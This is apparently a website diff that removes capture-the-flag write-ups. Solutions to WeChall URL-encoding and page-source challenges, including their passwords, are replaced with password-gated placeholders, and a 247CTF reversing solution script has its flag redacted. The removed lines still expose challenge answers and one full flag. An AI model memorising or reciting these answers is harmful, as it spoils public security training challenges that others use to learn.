-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%59%69%70%70%65%68%21%20%59%6F%75%72%20%55%52%4C%20%69%73%20%63%68%61%6C%6C%65%6E%67%65%2F%74%72%61%69%6E%69%6E%67%2F%65%6E%63%6F%64%69%6E%67%73%2F%75%72%6C%2F%73%61%77%5F%6C%6F%74%69%6F%6E%2E%70%68%70%3F%70%3D%70%68%67%6F%66%63%72%62%6F%69%73%62%26%63%69%64%3D%35%32%23%70%61%73%73%77%6F%72%64%3D%66%69%62%72%65%5F%6F%70%74%69%63%73%20%56%65%72%79%20%77%65%6C%6C%20%64%6F%6E%65%21</span><br></pre></td></tr></table></figure>
-<h3 id="solution">Solution</h3>
-<p>Use URL decode (e.g., CyberChef). The decoded message is:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Yippeh! Your URL is challenge/training/encodings/url/saw_lotion.php?p=phgofcrboisb&amp;cid=52#password=fibre_optics Very well done!</span><br></pre></td></tr></table></figure>
-<p>Append to https://www.wechall.net/ to visit the success URL. The
-password is the URL fragment.</p>
-<h3 id="flag">Flag</h3>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">fibre_optics</span></span>
-
+          Here's something encrypted, password is required to continue reading.
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/wp/WeChall/wechall-url-encode/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -2046,7 +1887,7 @@ password is the URL fragment.</p>
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-08 22:40:47" itemprop="dateModified" datetime="2026-09-08T22:40:47+08:00">2026-09-08</time>
+      <time title="Modified: 2026-09-23 14:59:49" itemprop="dateModified" datetime="2026-09-23T14:59:49+08:00">2026-09-23</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -2082,17 +1923,15 @@ password is the URL fragment.</p>
     
     
     <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>The solution is hidden in this page 答案就藏在这个页面里</p>
-</blockquote>
-<h3 id="challenge">Challenge</h3>
-<p>The hint says "check the source, end of html element". The solution
-is hidden somewhere in the HTML source of the challenge page.</p>
-<h3 id="solution">Solution</h3>
-<p>View page source. At the very bottom of the HTML, just before
-<code>&lt;/body&gt;</code>, there's an HTML comment:</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- You are looking for this password: *************** --&gt;</span></span><br></pre></td></tr></table></figure>
-
+          Here's something encrypted, password is required to continue reading.
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/wp/WeChall/wechall-get-sourced/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -2154,7 +1993,7 @@ is hidden somewhere in the HTML source of the challenge page.</p>
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-09 10:48:26" itemprop="dateModified" datetime="2026-09-09T10:48:26+08:00">2026-09-09</time>
+      <time title="Modified: 2026-09-23 15:01:05" itemprop="dateModified" datetime="2026-09-23T15:01:05+08:00">2026-09-23</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -2239,8 +2078,8 @@ key character decrypts 2 bytes of ciphertext.</p>
 <h2 id="solution-script">Solution Script</h2>
 <p>We can simulate the assembly operations to recover the unlock code
 and then use it to XOR the ciphertext bytes.</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="comment"># 1. Recover the 16-character unlock code</span></span><br><span class="line">    unlock_chars = [</span><br><span class="line">        <span class="number">0x4B</span> ^ <span class="number">0x0C</span>, <span class="number">0x53</span> ^ <span class="number">0x06</span>, <span class="number">0x58</span> - <span class="number">0x01</span>, <span class="number">0x62</span> - <span class="number">0x29</span>,</span><br><span class="line">        <span class="number">0x68</span> ^ <span class="number">0x23</span>, <span class="number">0x4B</span> ^ <span class="number">0x00</span>, <span class="number">0x62</span> - <span class="number">0x1E</span>, <span class="number">0x4D</span> - <span class="number">0x0B</span>,</span><br><span class="line">        <span class="number">0x45</span> ^ <span class="number">0x0D</span>, <span class="number">0x10</span> ^ <span class="number">0x28</span>, <span class="number">0x58</span> ^ <span class="number">0x1D</span>, <span class="number">0x7A</span> ^ <span class="number">0x28</span>,</span><br><span class="line">        <span class="number">0x65</span> - <span class="number">0x13</span>, <span class="number">0x33</span> ^ <span class="number">0x07</span>, <span class="number">0x25</span> ^ <span class="number">0x15</span>, <span class="number">0x4C</span> + <span class="number">0x0C</span></span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    unlock_code = <span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> unlock_chars)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Unlock Code: <span class="subst">&#123;unlock_code&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. Extract encrypted payload (32 bytes from offset 0x1B1)</span></span><br><span class="line">    <span class="comment"># This corresponds to memory 0x7DB1 (0x7DAA + 7)</span></span><br><span class="line">    payload_hex = <span class="string">&quot;77 21 67 30 60 35 0c 0c 78 79 2e 2e 20 72 70 75 29 2b 00 5c 21 70 62 63 65 60 07 0d 06 02 3b 3b&quot;</span></span><br><span class="line">    encrypted_bytes = <span class="built_in">bytes</span>.fromhex(payload_hex)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. Perform XOR decryption</span></span><br><span class="line">    decrypted_chars = []</span><br><span class="line">    <span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(encrypted_bytes):</span><br><span class="line">        key = unlock_chars[i // <span class="number">2</span>]</span><br><span class="line">        decrypted_chars.append(<span class="built_in">chr</span>(byte ^ key))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Flag: 247CTF&#123;&#123;<span class="subst">&#123; <span class="string">&#x27;&#x27;</span>.join(decrypted_chars) &#125;</span>&#125;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">247CTF{0f2e7b5532eed627ac8dd501723962cc}</span></span>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="comment"># 1. Recover the 16-character unlock code</span></span><br><span class="line">    unlock_chars = [</span><br><span class="line">        <span class="number">0x4B</span> ^ <span class="number">0x0C</span>, <span class="number">0x53</span> ^ <span class="number">0x06</span>, <span class="number">0x58</span> - <span class="number">0x01</span>, <span class="number">0x62</span> - <span class="number">0x29</span>,</span><br><span class="line">        <span class="number">0x68</span> ^ <span class="number">0x23</span>, <span class="number">0x4B</span> ^ <span class="number">0x00</span>, <span class="number">0x62</span> - <span class="number">0x1E</span>, <span class="number">0x4D</span> - <span class="number">0x0B</span>,</span><br><span class="line">        <span class="number">0x45</span> ^ <span class="number">0x0D</span>, <span class="number">0x10</span> ^ <span class="number">0x28</span>, <span class="number">0x58</span> ^ <span class="number">0x1D</span>, <span class="number">0x7A</span> ^ <span class="number">0x28</span>,</span><br><span class="line">        <span class="number">0x65</span> - <span class="number">0x13</span>, <span class="number">0x33</span> ^ <span class="number">0x07</span>, <span class="number">0x25</span> ^ <span class="number">0x15</span>, <span class="number">0x4C</span> + <span class="number">0x0C</span></span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    unlock_code = <span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> unlock_chars)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Unlock Code: <span class="subst">&#123;unlock_code&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. Extract encrypted payload (32 bytes from offset 0x1B1)</span></span><br><span class="line">    <span class="comment"># This corresponds to memory 0x7DB1 (0x7DAA + 7)</span></span><br><span class="line">    payload_hex = <span class="string">&quot;77 21 67 30 60 35 0c 0c 78 79 2e 2e 20 72 70 75 29 2b 00 5c 21 70 62 63 65 60 07 0d 06 02 3b 3b&quot;</span></span><br><span class="line">    encrypted_bytes = <span class="built_in">bytes</span>.fromhex(payload_hex)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. Perform XOR decryption</span></span><br><span class="line">    decrypted_chars = []</span><br><span class="line">    <span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(encrypted_bytes):</span><br><span class="line">        key = unlock_chars[i // <span class="number">2</span>]</span><br><span class="line">        decrypted_chars.append(<span class="built_in">chr</span>(byte ^ key))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Flag: 247CTF<span class="subst">&#123;&lt;flag-redacted&gt;&#125;</span>&#125;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">247CTF{<flag-redacted>}</span></span>
 
       
     </div>
